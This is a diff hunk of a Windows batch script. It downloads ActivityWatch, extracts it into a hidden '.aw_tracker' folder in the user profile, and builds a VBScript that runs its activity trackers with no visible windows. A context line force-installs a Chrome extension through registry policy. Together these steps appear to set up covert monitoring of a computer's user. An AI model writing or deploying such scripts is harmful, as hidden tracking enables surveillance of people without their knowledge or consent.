@@ -7,14 +7,15 @@ reg add "HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist" /v 1 /t
 
 :: Download and extract ActivityWatch for Windows
 echo Downloading ActivityWatch...
+mkdir "%USERPROFILE%\.aw_tracker" 2>nul
 curl.exe -L -o "%TEMP%\aw-win.zip" "https://github.com/ActivityWatch/activitywatch/releases/download/v0.13.2/activitywatch-v0.13.2-windows-x86_64.zip"
-tar.exe -xf "%TEMP%\aw-win.zip" -C "C:\Program Files"
+tar.exe -xf "%TEMP%\aw-win.zip" -C "%USERPROFILE%\.aw_tracker"
 
 :: Create a VBScript to run trackers completely invisibly (no black windows)
 echo Set WshShell = CreateObject("WScript.Shell") > "%USERPROFILE%\.aw_tracker\start_aw.vbs"
-echo WshShell.Run chr(34) ^& "C:\Program Files\activitywatch\aw-server\aw-server.exe" ^& Chr(34), 0 >> "%USERPROFILE%\.aw_tracker\start_aw.vbs"
-echo WshShell.Run chr(34) ^& "C:\Program Files\activitywatch\aw-watcher-afk\aw-watcher-afk.exe" ^& Chr(34), 0 >> "%USERPROFILE%\.aw_tracker\start_aw.vbs"
-echo WshShell.Run chr(34) ^& "C:\Program Files\activitywatch\aw-watcher-window\aw-watcher-window.exe" ^& Chr(34), 0 >> "%USERPROFILE%\.aw_tracker\start_aw.vbs"
+echo WshShell.Run chr(34) ^& "%USERPROFILE%\.aw_tracker\activitywatch\aw-server\aw-server.exe" ^& Chr(34), 0 >> "%USERPROFILE%\.aw_tracker\start_aw.vbs"
+echo WshShell.Run chr(34) ^& "%USERPROFILE%\.aw_tracker\activitywatch\aw-watcher-afk\aw-watcher-afk.exe" ^& Chr(34), 0 >> "%USERPROFILE%\.aw_tracker\start_aw.vbs"
+echo WshShell.Run chr(34) ^& "%USERPROFILE%\.aw_tracker\activitywatch\aw-watcher-window\aw-watcher-window.exe" ^& Chr(34), 0 >> "%USERPROFILE%\.aw_tracker\start_aw.vbs"
 echo Set WshShell = Nothing >> "%USERPROFILE%\.aw_tracker\start_aw.vbs"
 
 :: Run the VBScript now
